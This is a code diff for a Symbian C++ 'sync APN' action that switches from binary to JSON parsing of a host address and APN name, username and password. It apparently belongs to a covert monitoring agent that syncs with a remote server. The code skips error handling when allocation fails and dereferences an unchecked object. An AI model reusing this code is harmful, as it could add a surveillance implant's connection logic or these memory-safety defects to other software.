@@ -6,6 +6,7 @@
  */
 
 #include "ActionSyncApn.h"
+#include "Json.h"
 
 #include <HT\Processes.h>
 
@@ -73,77 +74,43 @@ void CActionSyncApn::ConstructL(const TDesC8& params)
 		
 	BaseConstructL(params);
 
-	// Parses the parameters...
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	
-	TUint32 lenHost = 0;
-	Mem::Copy(&lenHost, ptr, 4);
-	ptr += sizeof(TUint32);
-	
-	if (lenHost > 0)
+	//read parameters
+	RBuf paramsBuf;
+			
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
 		{
-		TUint8 totChars = (lenHost-1) / 2;
-		TPtr16 ptrHost((TUint16 *) ptr, totChars, totChars);
-		iHostName.Copy(ptrHost);
+		paramsBuf.Copy(params);
 		}
-	ptr += lenHost;
-	
-	TUint32 numApn = 0;
-	Mem::Copy(&numApn,ptr,4);
-	ptr += sizeof(TUint32);
-	
-	for(TInt i=0; i<numApn; i++)
+	else
 		{
-		TApnStruct apnStruct;
-		ptr += 8; //mcc and mnc not used
-		// retrieve apn name
-		TUint32 apnLen;
-		Mem::Copy(&apnLen,ptr,4);
-		ptr += 4;
-		if(apnLen>2)
-			{
-			TUint8 totChars = (apnLen-2) / 2;
-			TPtr16 ptrApn((TUint16 *) ptr, totChars, totChars);
-			apnStruct.apnName.Copy(ptrApn);
-			}
-		else 
-			{
-			apnStruct.apnName.Zero();
-			}
-		ptr += apnLen;
-		//retrieve username
-		TUint32 usrLen;
-		Mem::Copy(&usrLen,ptr,4);
-		ptr += 4;
-		if(usrLen>2)
-			{
-			TUint8 totChars = (usrLen-2) / 2;
-			TPtr16 ptrUsr((TUint16 *) ptr, totChars, totChars);
-			apnStruct.apnUsername.Copy(ptrUsr);
-			}
-		else 
-			{
-			apnStruct.apnUsername.Zero();
-			}
-		ptr += usrLen;
-		// retrieve password
-		TUint32 pwdLen;
-		Mem::Copy(&pwdLen,ptr,4);
-		ptr += 4;
-		if(pwdLen>2)
-			{
-			TUint8 totChars = (pwdLen-2) / 2;
-			TPtr16 ptrPwd((TUint16 *) ptr, totChars, totChars);
-			apnStruct.apnPasswd.Copy(ptrPwd);
-			}
-		else 
-			{
-			apnStruct.apnPasswd.Zero();
-			}
-		ptr += pwdLen;
-		
+		//TODO: not enough memory
+		}
+			
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	TApnStruct apnStruct;
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve apn data
+		CJsonObject* apnObject;
+		rootObject->GetObjectL(_L("apn"),apnObject);
+		apnObject->GetStringL(_L("name"),apnStruct.apnName);
+		apnObject->GetStringL(_L("user"),apnStruct.apnUsername);
+		apnObject->GetStringL(_L("pass"),apnStruct.apnPasswd);
 		iApnList.AppendL(apnStruct);
+		//retrieve host address
+		rootObject->GetStringL(_L("host"),iHostName);
+		CleanupStack::PopAndDestroy(rootObject);
 		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
 	
 	iSocketServ.Connect();
 	iProtocol = CProtocol::NewL(*this);	
